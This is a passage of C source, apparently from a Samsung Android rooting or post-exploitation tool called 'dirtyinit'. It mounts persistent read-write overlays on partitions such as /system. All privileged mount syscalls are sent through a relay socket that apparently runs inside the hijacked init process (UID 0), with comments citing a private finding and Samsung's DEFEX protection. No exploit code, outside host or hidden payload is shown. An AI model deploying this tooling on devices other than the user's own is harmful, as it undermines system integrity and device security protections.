            /* Allocate a temporary copy of the optional-tags region so we can
             * safely use strstr without worrying about field boundaries.
             * This is the same pattern overlay_is_shared uses. */
            char *opt_region = (char *)malloc(opt_span + 1);
            if (opt_region) {
                memcpy(opt_region, opt_start, opt_span);
                opt_region[opt_span] = '\0';
                if (strstr(opt_region, "shared:") != NULL)
                    shared = 1;
                free(opt_region);
            }

            /* Store into the raw collection if we have space.
             * If we exceed max_entries, silently stop collecting — the caller
             * sized the array for the realistic maximum. */
            if (raw_count < max_entries) {
                /* Zero the entire entry so temp_dir and moved start clean */
                memset(&out[raw_count], 0, sizeof(struct submount_entry));

                /* Copy mount_point, ensuring null termination even if the
                 * path is pathologically long (truncation is better than
                 * buffer overflow — and 256 chars covers any real path). */
                size_t copy_len = mp_len < sizeof(out[raw_count].mount_point) - 1
                                ? mp_len
                                : sizeof(out[raw_count].mount_point) - 1;
                memcpy(out[raw_count].mount_point, mount_point, copy_len);
                out[raw_count].mount_point[copy_len] = '\0';
                out[raw_count].shared_flag = shared;

                raw_count++;
            }
        }

        if (!nl) break;
        line = nl + 1;
    }
    free(data);

    if (raw_count == 0) {
        OVLOG("submounts: no submounts found under %s", target);
        return 0;
    }

    /* PASS 2: Deduplicate — keep only the LAST entry for each mount_point.
     *
     * The kernel lists mounts chronologically, so over-mounts (same path,
     * multiple stacked mounts) appear as multiple lines with the same
     * mount_point.  Only the topmost (last-listed) mount is visible and
     * needs to be MS_MOVE'd.
     *
     * Algorithm: walk backward from the end; for each entry, check if we've
     * already "kept" one with the same mount_point.  If so, mark this earlier
     * one for removal by zeroing its mount_point.  Then compact forward. */
    for (int i = 0; i < raw_count - 1; i++) {
        if (out[i].mount_point[0] == '\0')
            continue; /* already removed */
        for (int j = i + 1; j < raw_count; j++) {
            if (strcmp(out[i].mount_point, out[j].mount_point) == 0) {
                /* Entry j is later (topmost) — remove entry i (earlier/hidden) */
                out[i].mount_point[0] = '\0';
                break;
            }
        }
    }

    /* PASS 3: Filter — remove entries "covered" by a parent submount.
     *
     * If entry A = "/vendor/firmware" and entry B = "/vendor/firmware/nfc",
     * then MS_MOVE of A will carry B along as part of the subtree.  We don't
     * need (and must not) separately move B.
     *
     * An entry is "covered" if any OTHER collected entry's mount_point is a
     * strict prefix of it (i.e., it starts with other.mount_point + "/").
     * This matches AOSP's mount.cpp:471-484 filtering logic. */
    for (int i = 0; i < raw_count; i++) {
        if (out[i].mount_point[0] == '\0')
            continue; /* already removed by dedup */
        for (int j = 0; j < raw_count; j++) {
            if (i == j || out[j].mount_point[0] == '\0')
                continue;
            /* Check if entry j is a parent of entry i:
             * j.mount_point must be a prefix, AND i.mount_point must have
             * a '/' right after j's length (preventing "/vendorX" matching "/vendor") */
            size_t j_len = strlen(out[j].mount_point);
            if (strlen(out[i].mount_point) > j_len &&
                memcmp(out[i].mount_point, out[j].mount_point, j_len) == 0 &&
                out[i].mount_point[j_len] == '/') {
                /* Entry i is covered by entry j — skip it */
                out[i].mount_point[0] = '\0';
                break;
            }
        }
    }

    /* PASS 4: Compact — squeeze out removed entries (mount_point[0] == '\0')
     * so the caller gets a contiguous array of valid entries. */
    int final_count = 0;
    for (int i = 0; i < raw_count; i++) {
        if (out[i].mount_point[0] == '\0')
            continue;
        if (final_count != i) {
            memcpy(&out[final_count], &out[i], sizeof(struct submount_entry));
        }
        OVLOG("submounts: found %s (shared=%d)",
              out[final_count].mount_point, out[final_count].shared_flag);
        final_count++;
    }

    OVLOG("submounts: %d submount(s) under %s", final_count, target);
    return final_count;
}

/* overlay_setup_staging — create an MS_PRIVATE staging area on /dev for
 * safely MS_MOVE-ing submounts during overlay setup.
 *
 * WHY THIS EXISTS:
 * Android's /dev is MS_SHARED (set by init's mount_all).  Any mount
 * operation beneath a shared mount propagates to all peer groups.
 * When we MS_MOVE a submount into the overlay workdir and later MS_MOVE
 * it back, those moves would propagate through /dev's shared peer group,
 * potentially corrupting the mount namespace.
 *
 * AOSP solves this identically in fs_mgr/mount.cpp (kMoveMountTempDir =
 * "/dev/remount"):
 *   1. mkdir /dev/remount
 *   2. mount --bind /dev/remount /dev/remount   (self-bind)
 *   3. mount --make-private /dev/remount         (MS_PRIVATE)
 * The self-bind creates an independent mount at the path.  MS_PRIVATE
 * then detaches it from /dev's propagation group, so all MS_MOVE ops
 * beneath it stay local.  On function exit, a ScopeGuard does the
 * reverse: umount + rmdir.
 *
 * We follow the same pattern with OVL_STAGING_PATH ("/dev/.ovl_staging"),
 * using a dotfile to avoid conflicting with AOSP's own /dev/remount.
 *
 * Returns 0 on success, -1 on error (with partial cleanup on failure). */
static int overlay_setup_staging(int sock) {
    /* STEP 1: Create the directory.  overlay_mkdir_p tolerates EEXIST,
     * which can happen if a previous overlay_setup crashed after mkdir
     * but before cleanup completed. */
    OVLOG("staging: creating %s", OVL_STAGING_PATH);
    if (overlay_mkdir_p(sock, OVL_STAGING_PATH, 0755) < 0) {
        OVERR("staging: cannot mkdir %s", OVL_STAGING_PATH);
        return -1;
    }

    /* STEP 2: Bind-mount the directory to itself.  This creates a new
     * mount at OVL_STAGING_PATH that is separate from /dev's mount.
     * Without this, the directory is just a child of /dev and inherits
     * its MS_SHARED propagation.  The self-bind gives us our own mount
     * entry that we can then set to MS_PRIVATE independently.
     * (AOSP mount.cpp:733 — mount(kMoveMountTempDir, kMoveMountTempDir,
     *  nullptr, MS_BIND, nullptr)) */
    OVLOG("staging: bind-mounting %s to self", OVL_STAGING_PATH);
    int64_t bind_ret = relay_mount(sock,
                                   OVL_STAGING_PATH,  /* source: the dir itself */
                                   OVL_STAGING_PATH,  /* target: same path */
                                   NULL,               /* no fstype for bind */
                                   0x1000,             /* MS_BIND */
                                   NULL);              /* no options */
    if (bind_ret < 0) {
        OVERR("staging: bind mount %s failed: %s",
              OVL_STAGING_PATH, errno_str((int)(-bind_ret)));
        /* Clean up: remove the directory we just created.  relay_unlinkat
         * with MY_AT_REMOVEDIR performs rmdir via SYS_unlinkat. */
        relay_unlinkat(sock, OVL_STAGING_PATH, MY_AT_REMOVEDIR);
        return -1;
    }

    /* STEP 3: Make the mount MS_PRIVATE.  This is the critical step —
     * it severs the mount from /dev's shared peer group so that any
     * MS_MOVE operations we perform under this path stay local and
     * do NOT propagate to other mount namespaces or peer mounts.
     * (AOSP mount.cpp:737 — fs_mgr_overlayfs_set_shared_mount(path, false)
     *  which calls mount(NULL, path, NULL, MS_PRIVATE, NULL)) */
    OVLOG("staging: setting %s MS_PRIVATE", OVL_STAGING_PATH);
    int64_t priv_ret = relay_mount_simple(sock,
                                          OVL_STAGING_PATH,
                                          0x40000);  /* MS_PRIVATE */
    if (priv_ret < 0) {
        OVERR("staging: MS_PRIVATE %s failed: %s",
              OVL_STAGING_PATH, errno_str((int)(-priv_ret)));
        /* Clean up in reverse order: umount the bind mount, then rmdir.
         * We must umount before rmdir because the directory has a mount
         * on top of it (the bind from step 2). */
        size_t mlen = strlen(OVL_STAGING_PATH) + 1;
        uint8_t umbuf[64];
        memset(umbuf, 0, sizeof(umbuf));
        memcpy(umbuf, OVL_STAGING_PATH, mlen);
        send_syscall(sock, SYS_umount2, 0,0,0,0,0,0,
                     FLAG_X0_DATA, umbuf, mlen, NULL, 0);
        relay_unlinkat(sock, OVL_STAGING_PATH, MY_AT_REMOVEDIR);
        return -1;
    }

    OVLOG("staging: %s ready (bind+private)", OVL_STAGING_PATH);
    return 0;
}

/* overlay_cleanup_staging — tear down the MS_PRIVATE staging area.
 *
 * Reverse of overlay_setup_staging: umount the bind mount, then rmdir.
 * This follows AOSP's ScopeGuard pattern in mount.cpp — the cleanup
 * runs on function exit regardless of success/failure of the overlay
 * operation that used the staging area.
 *
 * TOLERATES ENOENT (errno 2) AND EINVAL (errno 22):
 * - ENOENT on umount/rmdir means the staging dir was already removed
 *   (e.g., /dev was re-mounted or the dir was never created).
 * - EINVAL on umount means nothing is mounted there (already unmounted
 *   or the bind never succeeded).
 * These are not errors — they just mean there is nothing to clean up.
 *
 * NEVER returns an error, because cleanup failure must not prevent
 * the caller from continuing (the staging area is transient and will
 * be cleaned up on next reboot regardless, since /dev is tmpfs). */
static void overlay_cleanup_staging(int sock) {
    /* STEP 1: Umount the bind mount.  Must happen before rmdir because
     * rmdir will fail with EBUSY if a mount still sits on the directory.
     * Uses the same umount2 pattern as overlay_teardown_scratch. */
    size_t mlen = strlen(OVL_STAGING_PATH) + 1;
    uint8_t umbuf[64];
    memset(umbuf, 0, sizeof(umbuf));
    memcpy(umbuf, OVL_STAGING_PATH, mlen);
    int64_t ur = send_syscall(sock, SYS_umount2, 0,0,0,0,0,0,
                              FLAG_X0_DATA, umbuf, mlen, NULL, 0);
    if (ur < 0) {
        int err = (int)(-ur);
        /* ENOENT (2): path does not exist — nothing to umount.
         * EINVAL (22): nothing mounted there — already clean.
         * Both are benign: the staging area is simply not present. */
        if (err != 2 && err != 22) {
            OVERR("staging: umount %s warning: %s (non-fatal)",
                  OVL_STAGING_PATH, errno_str(err));
        }
    } else {
        OVLOG("staging: umounted %s", OVL_STAGING_PATH);
    }

    /* STEP 2: Remove the directory.  relay_unlinkat with MY_AT_REMOVEDIR
     * performs rmdir via SYS_unlinkat(AT_FDCWD, path, AT_REMOVEDIR).
     * Tolerates ENOENT (already gone) silently. */
    int64_t rr = relay_unlinkat(sock, OVL_STAGING_PATH, MY_AT_REMOVEDIR);
    if (rr < 0) {
        int err = (int)(-rr);
        /* ENOENT (2): already removed — perfectly fine.
         * Any other error is logged but NOT propagated. */
        if (err != 2) {
            OVERR("staging: rmdir %s warning: %s (non-fatal)",
                  OVL_STAGING_PATH, errno_str(err));
        }
    } else {
        OVLOG("staging: removed %s", OVL_STAGING_PATH);
    }

    /* No return value — cleanup is best-effort.  /dev is tmpfs, so
     * even if we leak the directory, it vanishes on next reboot. */
}

/* overlay_evacuate_submounts — MS_MOVE submounts out of a partition.
 *
 * Phase 3 of overlay setup.  Before we can overlay-mount a partition,
 * every child mount underneath it must be temporarily evacuated to a
 * staging area.  The kernel's do_move_mount (namespace.c:2503-2506)
 * reuses the struct mount in place — it detaches the mountpoint from
 * the old parent and reattaches it under the new one.  Because the
 * vfsmount pointer itself is unchanged, ALL open file descriptors that
 * reference files on the submount remain valid throughout the move.
 * This is why MS_MOVE is safe for live submounts, even on a booted
 * system with services actively using the filesystem.
 *
 * Each submount is MS_MOVE'd to a flat-named directory under
 * OVL_STAGING_PATH.  The relative path below `target` is encoded by
 * replacing "/" with "@" so the staging area remains a single flat
 * directory level (avoids needing recursive mkdir).
 *
 * Example:
 *   target    = "/system"
 *   submount  = "/system/carrier/TMB"
 *   relative  = "carrier/TMB"
 *   temp_dir  = "/dev/.ovl_staging/carrier@TMB"
 *
 * SHARED SUBMOUNTS: The kernel rejects MS_MOVE when the source mount
 * is shared and its parent is private (namespace.c:3241:
 *   if (attached && IS_MNT_SHARED(parent)) goto out;   → EINVAL).
 * The caller already set the target partition to MS_PRIVATE before
 * calling us, so any shared submount would hit this check.  We must
 * flip shared submounts to MS_PRIVATE before the MS_MOVE, then
 * restore MS_SHARED after the restore phase moves them back.
 * (AOSP mount.cpp:516-517 does exactly this.)
 *
 * ON FAILURE: If any single submount fails to move, we log a warning,
 * restore its propagation state if we changed it, rmdir the temp dir,
 * and CONTINUE to the next entry.  A partial evacuation is acceptable
 * — the caller can still attempt the overlay mount, and the restore
 * phase will move back whatever was successfully evacuated.
 *
 * @param sock          Relay socket for init-context syscalls.
 * @param target        The partition mount point being overlaid (e.g. "/system").
 *                      Used to compute the relative submount path for temp dir naming.
 * @param entries       Array of submount_entry structs (from overlay_parse_submounts).
 * @param count         Number of entries in the array.
 * @return              Number of submounts successfully moved (0 to count),
 *                      or -1 on critical infrastructure error (staging dir unusable). */
static int overlay_evacuate_submounts(int sock, const char *target,
                                      struct submount_entry *entries, int count)
{
    if (count == 0) {
        /* No submounts to move — this is the common case for partitions
         * like /product or /system_ext that rarely have bind mounts. */
        OVLOG("evacuate: no submounts under %s, nothing to do", target);
        return 0;
    }

    OVLOG("evacuate: moving %d submount(s) out of %s", count, target);

    size_t target_len = strlen(target);
    int moved_count = 0;

    for (int i = 0; i < count; i++) {
        struct submount_entry *e = &entries[i];

        /* Clear evacuation state from any prior run.  moved=0 means
         * the restore phase will skip this entry if we fail below. */
        e->moved = 0;
        memset(e->temp_dir, 0, sizeof(e->temp_dir));

        /* --- Build the temp dir path --- */

        /* Skip past the target prefix and any trailing slash to get
         * the relative path.  For "/system/carrier/TMB" with target
         * "/system", this yields "carrier/TMB". */
        const char *rel = e->mount_point + target_len;
        while (*rel == '/') rel++;

        if (*rel == '\0') {
            /* The submount IS the target itself — this should never happen
             * because overlay_parse_submounts filters these, but guard
             * against it defensively.  Skipping is safe: we cannot move
             * a mount onto itself, and the overlay mount will replace it. */
            OVERR("evacuate: entry %d is target itself (%s), skipping",
                  i, e->mount_point);
            continue;
        }

        /* Construct "/dev/.ovl_staging/" + rel_with_slashes_as_at.
         * snprintf the base, then append character-by-character to
         * perform the "/" → "@" replacement in a single pass. */
        snprintf(e->temp_dir, sizeof(e->temp_dir), "%s/", OVL_STAGING_PATH);
        size_t base_len = strlen(e->temp_dir);

        for (size_t j = 0; rel[j] != '\0' && base_len + j < sizeof(e->temp_dir) - 1; j++) {
            /* Replace path separators with "@" so the staging area stays
             * flat.  "@" is chosen because it never appears in Android
             * partition paths and is visually distinctive in logs. */
            e->temp_dir[base_len + j] = (rel[j] == '/') ? '@' : rel[j];
            e->temp_dir[base_len + j + 1] = '\0';
        }

        OVLOG("evacuate: [%d/%d] %s → %s (shared=%d)",
              i + 1, count, e->mount_point, e->temp_dir, e->shared_flag);

        /* --- Create the temp directory --- */

        /* overlay_mkdir_p tolerates EEXIST, which handles the case where
         * a previous evacuation crashed after mkdir but before cleanup. */
        if (overlay_mkdir_p(sock, e->temp_dir, 0755) < 0) {
            OVERR("evacuate: cannot mkdir %s, skipping %s",
                  e->temp_dir, e->mount_point);
            continue;
        }

        /* --- Handle shared propagation --- */

        /* If this submount is in a shared peer group, we must switch it
         * to MS_PRIVATE before the MS_MOVE.  Reason: the target partition
         * (the parent mount) is already MS_PRIVATE (the caller did this
         * in Phase 2).  namespace.c:3241 checks:
         *     if (attached && IS_MNT_SHARED(parent)) goto out;
         * But the SYMMETRIC issue also applies: a shared SOURCE mount
         * would propagate the MS_MOVE to all peers in its peer group,
         * which would corrupt other mount trees (e.g., containers or
         * cloned namespaces).  AOSP mount.cpp:516-517 sets MS_PRIVATE
         * on each shared submount before moving for exactly this reason. */
        if (e->shared_flag) {
            OVLOG("evacuate: setting %s MS_PRIVATE (was shared)", e->mount_point);
            int64_t pret = relay_mount_simple(sock, e->mount_point,
                                              0x40000);  /* MS_PRIVATE */
            if (pret < 0) {
                /* Cannot clear shared — the MS_MOVE will fail with EINVAL.
                 * Clean up the temp dir and skip this submount. */
                OVERR("evacuate: MS_PRIVATE %s failed: %s, skipping",
                      e->mount_point, errno_str((int)(-pret)));
                relay_unlinkat(sock, e->temp_dir, MY_AT_REMOVEDIR);
                continue;
            }
        }

        /* --- Perform the MS_MOVE --- */

        /* mount(source, target, NULL, MS_MOVE, NULL)
         * MS_MOVE = 0x2000 (immutable kernel ABI since 2.4.x).
         * This atomically detaches the mount from e->mount_point and
         * reattaches it at e->temp_dir.  The struct mount is reused
         * in place (namespace.c:2503-2506), so:
         *   - Open fds on files in the submount remain valid
         *   - Paths under the old mountpoint become empty (show lower fs)
         *   - Paths under the new mountpoint show the submount's content
         *
         * SELinux check: hooks.c:2839-2852 checks FILE__MOUNTON on the
         * DESTINATION only.  Our destination is under /dev (device:dir),
         * and init has mounton permission on device:dir, so this passes. */
        int64_t mret = relay_mount(sock,
                                   e->mount_point,   /* source: where mount is now */
                                   e->temp_dir,       /* target: where to move it */
                                   NULL,              /* no fstype for MS_MOVE */
                                   0x2000,            /* MS_MOVE */
                                   NULL);             /* no options */
        if (mret < 0) {
            OVERR("evacuate: MS_MOVE %s → %s failed: %s",
                  e->mount_point, e->temp_dir, errno_str((int)(-mret)));

            /* Roll back: if we changed propagation, restore shared state
             * so the mount tree is left exactly as we found it. */
            if (e->shared_flag) {
                OVLOG("evacuate: restoring MS_SHARED on %s after move failure",
                      e->mount_point);
                relay_mount_simple(sock, e->mount_point,
                                   0x100000);  /* MS_SHARED */
                /* Ignore error — best-effort rollback.  If MS_SHARED also
                 * fails, the submount stays private, which is less harmful
                 * than leaving it in a half-moved state.  The next reboot
                 * will restore correct propagation from fstab. */
            }

            /* Remove the now-unused temp directory. */
            relay_unlinkat(sock, e->temp_dir, MY_AT_REMOVEDIR);
            continue;
        }

        /* Mark as successfully moved so the restore phase knows to
         * process this entry. */
        e->moved = 1;
        moved_count++;

        OVLOG("evacuate: [%d/%d] moved %s → %s OK",
              i + 1, count, e->mount_point, e->temp_dir);
        printf("  [evacuate] %s → %s\n", e->mount_point, e->temp_dir);
    }

    OVLOG("evacuate: %d/%d submounts moved from %s", moved_count, count, target);
    printf("  [evacuate] %d/%d submounts moved\n", moved_count, count);

    return moved_count;
}

/* overlay_restore_submounts — MS_MOVE submounts back after overlay mount.
 *
 * Phase 5 of overlay setup.  The inverse of overlay_evacuate_submounts:
 * moves each evacuated submount from its staging temp dir back to its
 * original mount point, then restores MS_SHARED propagation if the
 * submount was shared before evacuation.
 *
 * SAFETY GUARANTEE: This function MUST run unconditionally after
 * evacuate, regardless of whether the overlay mount succeeded or failed.
 * (AOSP mount.cpp:533-541 uses a ScopeGuard to ensure restoration.)
 * The mount tree must be left in a consistent state — a submount parked
 * in /dev/.ovl_staging with no path back would cause services that
 * reference the original paths (e.g., /system/carrier/TMB) to see
 * empty directories (the lower filesystem), breaking carrier configs,
 * vendor blobs, or other submount-dependent functionality.
 *
 * NEVER ABORTS ON INDIVIDUAL FAILURE: If any single restore fails,
 * we log an error and continue to the next entry.  A partially-restored
 * mount tree is better than an unrestored one.  The next reboot will
 * fix everything anyway (init re-reads fstab), but we minimize damage
 * to the running system by restoring as many submounts as possible.
 *
 * RESTORATION ORDER: Entries are processed in the same order as the
 * entries array (typically sorted by mountinfo order).  For Android
 * partitions this is fine — submounts do not have nesting dependencies
 * among themselves (they are all direct children of the partition).
 *
 * @param sock          Relay socket for init-context syscalls.
 * @param entries       Array of submount_entry structs (same array passed to evacuate).
 * @param count         Number of entries in the array.
 * @return              0 if all moved submounts were restored successfully,
 *                      or the count of entries that failed to restore. */
static int overlay_restore_submounts(int sock, struct submount_entry *entries,
                                     int count)
{
    if (count == 0) {
        /* Nothing to restore — matches the evacuate no-op case. */
        return 0;
    }

    OVLOG("restore: restoring submounts (%d entries)", count);

    int fail_count = 0;

    for (int i = 0; i < count; i++) {
        struct submount_entry *e = &entries[i];

        /* Only process entries that were successfully moved by evacuate.
         * Entries with moved=0 were either skipped (mkdir failure, move
         * failure) or were never attempted.  Trying to MS_MOVE from a
         * temp_dir that has no mount on it would fail with EINVAL and
         * produce confusing log output. */
        if (!e->moved) {
            continue;
        }

        OVLOG("restore: [%d/%d] %s ← %s (shared=%d)",
              i + 1, count, e->mount_point, e->temp_dir, e->shared_flag);

        /* --- MS_MOVE back to original location --- */

        /* mount(source, target, NULL, MS_MOVE, NULL)
         * Source is now the staging temp dir (where the mount currently
         * lives), target is the original mount point.
         *
         * After the overlay mount succeeded, the original mount point
         * now lives on the overlay filesystem — but that is fine.  The
         * directory still exists (it is part of the merged lower+upper
         * view), and SELinux allows init to mounton system_file:dir
         * (hooks.c:2839 checks FILE__MOUNTON on destination).
         *
         * If the overlay mount FAILED, the original mount point is the
         * bare partition directory — also fine, that is where the
         * submount lived before evacuation. */
        int64_t mret = relay_mount(sock,
                                   e->temp_dir,        /* source: staging location */
                                   e->mount_point,     /* target: original location */
                                   NULL,               /* no fstype for MS_MOVE */
                                   0x2000,             /* MS_MOVE */
                                   NULL);              /* no options */
        if (mret < 0) {
            OVERR("restore: MS_MOVE %s → %s failed: %s",
                  e->temp_dir, e->mount_point, errno_str((int)(-mret)));
            printf("  [restore] FAILED: %s → %s (%s)\n",
                   e->temp_dir, e->mount_point, errno_str((int)(-mret)));
            fail_count++;
            /* Do NOT skip shared restoration or temp dir cleanup — we
             * must still attempt those even if the move itself failed,
             * because the mount might be stuck in staging and we need
             * to at least clean up the directory entry. */
        } else {
            OVLOG("restore: moved %s back to %s", e->temp_dir, e->mount_point);
            printf("  [restore] %s ← %s\n", e->mount_point, e->temp_dir);
        }

        /* --- Restore MS_SHARED if the submount was originally shared --- */

        /* We set the submount to MS_PRIVATE during evacuation to allow
         * the MS_MOVE.  Now that it is back in place, we must restore
         * its original shared propagation so that mount events propagate
         * correctly to any peer groups (e.g., container namespaces,
         * app namespaces created by zygote).
         *
         * We only do this if the MS_MOVE back succeeded (mret >= 0).
         * If the move failed, the mount is still in staging — setting
         * it to MS_SHARED there would be meaningless and could cause
         * unexpected propagation of future staging-area operations. */
        if (e->shared_flag && mret >= 0) {
            OVLOG("restore: re-applying MS_SHARED on %s", e->mount_point);
            int64_t sret = relay_mount_simple(sock, e->mount_point,
                                              0x100000);  /* MS_SHARED */
            if (sret < 0) {
                /* Failing to restore shared is a degradation, not a
                 * disaster.  The submount works fine as MS_PRIVATE —
                 * it just won't propagate mount events to peers.  This
                 * only matters if there are cloned namespaces observing
                 * this mount, which is rare for boot-time submounts.
                 * Log it so the user knows, but do not count it as a
                 * restore failure (the mount IS back in the right place). */
                OVERR("restore: MS_SHARED %s failed: %s (mount is back but private)",
                      e->mount_point, errno_str((int)(-sret)));
            }
        }

        /* --- Remove the staging temp directory --- */

        /* The temp dir should be empty now (the mount was moved out of
         * it).  If the MS_MOVE back failed, the mount is still on the
         * temp dir — rmdir will fail with EBUSY, which is fine: the
         * staging cleanup (overlay_cleanup_staging) will handle it by
         * unmounting the entire staging area. */
        int64_t rr = relay_unlinkat(sock, e->temp_dir, MY_AT_REMOVEDIR);
        if (rr < 0) {
            int err = (int)(-rr);
            /* EBUSY (16): mount still there — expected if move-back failed.
             * ENOENT (2): already gone — harmless.
             * Anything else: log but continue. */
            if (err != 16 && err != 2) {
                OVERR("restore: rmdir %s warning: %s (non-fatal)",
                      e->temp_dir, errno_str(err));
            }
        }

        /* Clear the moved flag so the entry is not double-processed
         * if restore is accidentally called twice. */
        e->moved = 0;
    }

    if (fail_count == 0) {
        OVLOG("restore: all submounts restored successfully");
    } else {
        OVERR("restore: %d submount(s) failed to restore", fail_count);
    }

    return fail_count;
}

/* overlay_print_status — display all overlay mounts with parsed options.
 *
 * Enhanced version of the original cmd_overlayfs: parses the options field
 * to show upperdir, lowerdir, workdir separately, and flags rw/ro state.
 * This is the "overlay status" subcommand. */
static int overlay_print_status(int sock) {
    uint8_t *data = NULL;
    ssize_t sz = relay_read_file(sock, "/proc/mounts", &data, 0);
    if (sz <= 0 || !data) {
        fprintf(stderr, "overlay: cannot read /proc/mounts\n");
        free(data);
        return 1;
    }
    data[sz] = '\0';

    int found = 0;
    char *line = (char *)data;
    while (*line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';

        /* Parse /proc/mounts fields: source mountpoint type options dump pass
         * Check field 3 (type) for "overlay" — source field varies by tool */
        {
            const char *f1 = line;
            const char *f1_end = strchr(f1, ' ');
            if (!f1_end) { if (!nl) break; line = nl + 1; continue; }
            const char *mp_start = f1_end + 1;
            const char *mp_end = strchr(mp_start, ' ');
            if (!mp_end) { if (!nl) break; line = nl + 1; continue; }
            const char *type_start = mp_end + 1;
            const char *type_end = strchr(type_start, ' ');
            if (!type_end) { if (!nl) break; line = nl + 1; continue; }
            size_t type_len = (size_t)(type_end - type_start);
            if (type_len != 7 || memcmp(type_start, "overlay", 7) != 0) {
                if (!nl) break;
                line = nl + 1;
                continue;
            }
        }
        {
            const char *f1_end = strchr(line, ' ');
            if (!f1_end) { if (!nl) break; line = nl + 1; continue; }
            const char *mp_start = f1_end + 1;
            const char *mp_end = strchr(mp_start, ' ');
            if (!mp_end) { if (!nl) break; line = nl + 1; continue; }
            const char *type_end = strchr(mp_end + 1, ' ');
            if (!type_end) { if (!nl) break; line = nl + 1; continue; }

            const char *opts_start = type_end + 1;
            const char *opts_end = strchr(opts_start, ' ');
            if (!opts_end) opts_end = opts_start + strlen(opts_start);

            printf("  source: %.*s\n", (int)(f1_end - line), line);
            printf("  mount:  %.*s\n", (int)(mp_end - mp_start), mp_start);

            if (strncmp(opts_start, "rw", 2) == 0) {
                printf("  state:  rw\n");
            } else if (strncmp(opts_start, "ro", 2) == 0) {
                printf("  state:  ro\n");
            }

            size_t opts_len = (size_t)(opts_end - opts_start);
            char *opts_buf = (char *)malloc(opts_len + 1);
            if (!opts_buf) { if (!nl) break; line = nl + 1; continue; }
            memcpy(opts_buf, opts_start, opts_len);
            opts_buf[opts_len] = '\0';

            /* Scan comma-separated options for overlay-specific keys */
            char *saveptr = NULL;
            char *tok = strtok_r(opts_buf, ",", &saveptr);
            while (tok) {
                if (strncmp(tok, "lowerdir=", 9) == 0) {
                    printf("  lower: %s\n", tok + 9);
                } else if (strncmp(tok, "upperdir=", 9) == 0) {
                    printf("  upper: %s\n", tok + 9);
                } else if (strncmp(tok, "workdir=", 8) == 0) {
                    printf("  work:  %s\n", tok + 8);
                }
                tok = strtok_r(NULL, ",", &saveptr);
            }

            free(opts_buf);

            if (found > 0) printf("\n"); /* blank line between entries */
            found++;
        }

        if (!nl) break;
        line = nl + 1;
    }
    free(data);

    if (!found) printf("No overlay mounts found\n");
    return 0;
}

/* overlay_setup — mount a persistent RW overlay on a partition.
 *
 * Implements the full 10-step setup sequence from FINDING.md section 2.1,
 * with mount propagation handling from section 2.2.
 *
 * The partition argument defaults to "/system". The upperdir/workdir paths
 * are derived by stripping the leading "/" (e.g. "/system" → "system"):
 *   upperdir = /data/overlay/system/upper
 *   workdir  = /data/overlay/system/work
 *
 * fscreate context is ALWAYS restored even on error paths — a dangling
 * fscreate context would cause all subsequent init file creation to produce
 * files with the wrong SELinux label, which could brick the device. */
static int overlay_setup(int sock, const char *partition) {
    /* Mount flag constants from <linux/mount.h> — immutable kernel ABI */
    const unsigned long MS_NOATIME = 0x400;   /* don't update atime */
    const unsigned long MS_REC     = 0x4000;   /* recursive propagation */
    const unsigned long MS_PRIVATE = 0x40000;  /* make mount private */
    const unsigned long MS_SHARED  = 0x100000; /* make mount shared */

    /* Submount tracking — Phase 3+5 of AOSP overlay protocol.
     * Filled by overlay_parse_submounts, used by evacuate/restore. */
    struct submount_entry submounts[MAX_SUBMOUNTS];
    int submount_count = 0;
    int submount_moved_count = 0;

    OVLOG("overlay_setup: target=%s", partition);

    /* ── Step 1: Verify relay UID=0 (FINDING.md section 4: "pid 1 → DEFEX_ALLOW")
     * All mount operations require root. If the relay is not running as init
     * (UID 0), every subsequent syscall will fail with EPERM. Check early. */
    int64_t uid = send_syscall(sock, SYS_getuid, 0,0,0,0,0,0, 0, NULL,0, NULL,0);
    OVLOG("step1: relay UID=%lld", (long long)uid);
    if (uid != 0) {
        fprintf(stderr, "overlay: relay UID is %lld, expected 0 (root/init)\n",
                (long long)uid);
        fprintf(stderr, "  overlay mount requires init context (pid 1, UID 0)\n");
        return 1;
    }

    /* ── Step 2: Check if overlay is already mounted on target
     * Prevents double-mounting, which would stack overlays and cause
     * kernel confusion (FILESYSTEM_MAX_STACK_DEPTH=2, FINDING.md section 5) */
    int mounted = overlay_check_mounted(sock, partition);
    if (mounted < 0) {
        fprintf(stderr, "overlay: cannot read /proc/mounts to check existing mounts\n");
        return 1;
    }
    if (mounted) {
        fprintf(stderr, "overlay: %s already has an overlay mounted\n", partition);
        fprintf(stderr, "  use 'overlay teardown %s' first, then retry\n", partition);
        return 1;
    }

    /* Derive subdir name from partition path: strip leading "/" chars.
     * "/system" → "system", "/vendor" → "vendor", "/product" → "product" */
    const char *subdir = partition;
    while (*subdir == '/') subdir++;
    if (!*subdir) {
        fprintf(stderr, "overlay: invalid partition path '%s'\n", partition);
        return 1;
    }

    /* ── Step 3: Set up scratch partition (casefold-free ext4 on /data)
     * Samsung's /data has ext4 casefolding (CONFIG_UNICODE=y), which sets
     * DCACHE_OP_HASH on ALL dentries. ovl_dentry_weird() (super.c:150-153)
     * rejects these with EINVAL. AOSP works around this with a "scratch
     * partition" — a loop-mounted ext4 image WITHOUT casefold.
     * See: MakeScratchFilesystem (control.cpp:383-409) */

    /* Find assets directory from the dirtyinit binary's own path.
     * The APK extracts assets to the app's native lib dir or data dir.
     * The user must have extracted overlay_scratch.img alongside dirtyinit. */
    printf("overlay: setting up scratch partition (casefold-free ext4)\n");
    if (overlay_setup_scratch(sock) < 0) {
        fprintf(stderr, "overlay: scratch partition setup failed\n");
        return 1;
    }

    /* Build directory paths on the SCRATCH mount (not /data directly!) */
    char base_dir[512];
    char part_dir[512];
    char upper_dir[512];
    char work_dir[512];
    snprintf(base_dir,  sizeof(base_dir),  "%s", SCRATCH_MNT);
    snprintf(part_dir,  sizeof(part_dir),  "%s/%s", SCRATCH_MNT, subdir);
    snprintf(upper_dir, sizeof(upper_dir), "%s/%s/upper", SCRATCH_MNT, subdir);
    snprintf(work_dir,  sizeof(work_dir),  "%s/%s/work", SCRATCH_MNT, subdir);
    OVLOG("paths: base=%s part=%s upper=%s work=%s",
          base_dir, part_dir, upper_dir, work_dir);

    /* ── Step 4: Create overlay dirs on the scratch filesystem.
     * The scratch ext4 is unlabeled:s0 (no context= mount option because
     * overlayfs_file is not in contextmount_type, and overlayfs_file can't
     * associate with unlabeled filesystem). Init has full permissions on
     * unlabeled dirs/files. Do NOT set fscreate — let dirs inherit unlabeled
     * from the filesystem. Copy-up uses the LOWER file's SID regardless
     * (selinux_inode_copy_up, hooks.c:3595). */
